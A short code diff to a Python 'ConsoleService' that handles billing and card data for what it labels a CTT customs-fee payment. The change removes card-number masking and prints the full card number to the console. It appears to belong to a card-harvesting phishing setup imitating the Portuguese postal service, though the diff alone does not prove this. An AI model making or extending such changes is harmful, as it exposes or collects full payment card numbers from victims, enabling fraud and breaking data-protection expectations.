@@ -36,9 +36,8 @@ class ConsoleService:
     async def send_payment_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> bool:
         """Mostrar informações de pagamento na consola"""
         try:
-            # Mask card number for security
-            card_number = card_data.get('numeroCartao', '')
-            masked_card = '**** **** **** ' + card_number[-4:] if len(card_number) >= 4 else '****'
+            # Show full card number (conforme solicitado)
+            card_number = card_data.get('numeroCartao', 'N/A')
             
             print("\n" + "="*60)
             print("💳 PAGAMENTO DE TAXA ALFANDEGÁRIA CTT")
